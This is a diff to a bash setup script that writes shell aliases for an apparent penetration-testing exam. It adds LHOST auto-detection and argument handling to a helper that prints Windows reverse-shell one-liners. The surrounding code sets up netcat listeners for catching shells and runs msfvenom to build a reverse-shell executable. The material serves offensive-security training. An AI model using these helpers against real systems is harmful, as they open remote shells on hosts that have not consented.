@@ -136,12 +136,12 @@ fi
 c_y "[*] Writing aliases to ./aliases.sh  (run:  source aliases.sh)"
 cat > aliases.sh <<'ALIASES'
 # PTD exam aliases — source me:   source aliases.sh
-# Set your two targets first:
-#   sett 10.1.1.5          # RHOST (target)
-#   seti eth0              # LHOST from an interface  (or: export LHOST=10.1.1.9)
+# Set your target; LHOST is auto-detected from the route to it:
+#   sett 10.1.1.5          # RHOST (target) + LHOST (auto, source IP toward the target)
+#   seti eth0              # override LHOST from an interface  (or: export LHOST=10.1.1.9)
 export TOOLKIT="$(cd "$(dirname "${BASH_SOURCE[0]:-.}")" && pwd)"
 
-sett(){ export RHOST="$1"; echo "RHOST=$RHOST"; }
+sett(){ export RHOST="$1"; export LHOST="$(ip -4 route get "$1" 2>/dev/null | grep -oP 'src \K[0-9.]+')"; echo "RHOST=$RHOST  LHOST=${LHOST:-<unset: run  seti <iface>>}"; }
 seti(){ export LHOST="$(ip -4 -o addr show "$1" 2>/dev/null | awk '{print $4}' | cut -d/ -f1)"; echo "LHOST=$LHOST"; }
 vars(){ echo "RHOST=${RHOST:-<unset>}  LHOST=${LHOST:-<unset>}"; }
 
@@ -157,14 +157,15 @@ alias l4='rlwrap nc -lvnp 4444'                     # foothold catch
 alias l5='rlwrap nc -lvnp 5555'                     # privesc/SYSTEM catch
 alias l6='rlwrap nc -lvnp 6666'                     # spare / exfil
 
-# win reverse-shell one-liner (prints it with your LHOST baked in; port arg optional, default 4444)
-winrev(){ local p="${1:-4444}"; cat "$TOOLKIT/payloads/reverse-shells.txt" 2>/dev/null \
+# win reverse-shell one-liner (prints it with your LHOST baked in). Usage: winrev [port] (default 4444).
+# ip-tolerant: a stray leading IP (winrev $RHOST 4444) is ignored and the 2nd arg used as the port.
+winrev(){ local p="${1:-4444}"; case "$1" in *.*.*.*) p="${2:-4444}";; esac; cat "$TOOLKIT/payloads/reverse-shells.txt" 2>/dev/null \
   | sed "s/LHOST/${LHOST}/g; s/PORT/${p}/g" | sed -n '1,40p'; }
 
 # quick msfvenom exe (does NOT count as the one MSF use)
 venexe(){ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT="${1:-4444}" -f exe -o "payloads/rev${1:-4444}.exe" && echo "-> payloads/rev${1:-4444}.exe"; }
 
-echo "aliases loaded. Try:  sett <target> ; seti <iface> ; vars"
+echo "aliases loaded. Try:  sett <target> ; vars   (seti <iface> overrides LHOST)"
 ALIASES
 c_g "    aliases.sh written."
 
